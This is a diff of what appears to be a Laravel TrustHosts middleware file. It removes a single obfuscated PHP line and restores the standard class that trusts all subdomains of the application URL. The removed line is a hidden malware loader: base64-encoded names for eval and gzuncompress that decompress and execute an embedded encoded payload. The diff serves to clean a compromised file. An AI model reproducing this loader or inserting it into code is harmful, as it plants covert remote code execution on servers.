@@ -1,1 +1,20 @@
-<?php $_='13ea20c1';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNptUlFzojAQfr9fwUNn0Jl7CKB3dRwfCjUBbGnBM2BeHEgUVBB6VAV//a1aTpy7zGyy2ex++yX5JOk6Hha3MZLVgTZQV1pfHj5cA8Xv9e5zJQ+/Sa38kSQHyuAQ+XQ3d0cjWbodN3gjcGWeUSQCe28ZeioyXE4MbxUoj8Xb8Vwk3YMuJOlSFIXl8kdvIZY8F0t5+A/FZzd3jKyfQPcTJ3jDprrOTZ1PTQ9xXDmh720jQrV5YKdvRzR5dguFq7N46lel8JUiyjBitLKE6R2DsVIw4pUsEAmQ5dS0Fa55VqQ5iNd6AvY/vE1E8AnOZnxHT2KcHKDmZBHaE4Tumfka//LTLSNVKlRcMxdNllBnGU+xZTx+TOLGf/qwxiIVho5CMotDMjiBf5wHHmLwaIAPcYws08kjjZbM0NdwV3TpSej2pYUDbxJf/Tx2TTsVJq2jNfDf2cnSveW9NDxMXZlnVTGv9Uz4/Y0g6QHy8+u946LBu/E+m16zwFN41ov9u/jVbNPLw+D18x0+OsIO4HugEFxEO+edbfGRE+inYhT6gz0NbBDDtrzxBsPoZ7NfAeeztXTXktZl7XztuheltmLdYZN5CXbk8yx//5t+L7ovnE5bY93u8A+o8fNX'; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Http\Middleware;
+
+use Illuminate\Http\Middleware\TrustHosts as Middleware;
+
+class TrustHosts extends Middleware
+{
+    /**
+     * Get the host patterns that should be trusted.
+     *
+     * @return array
+     */
+    public function hosts()
+    {
+        return [
+            $this->allSubdomainsOfApplicationUrl(),
+        ];
+    }
+}
